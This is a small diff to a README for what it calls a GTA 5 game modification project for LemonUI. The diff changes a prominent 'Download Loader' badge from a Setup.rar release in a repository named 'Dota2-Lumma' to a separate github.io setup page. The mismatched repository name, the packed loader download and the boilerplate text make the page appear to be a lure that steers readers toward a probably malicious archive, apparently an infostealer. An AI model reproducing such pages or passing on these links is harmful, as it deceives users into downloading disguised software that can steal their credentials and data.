@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for LemonUI
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `LemonUI` · Updated: 2026-11-03
 
 **Tags:** `gta-5` `user-interface` `dotnet`
+
 
 
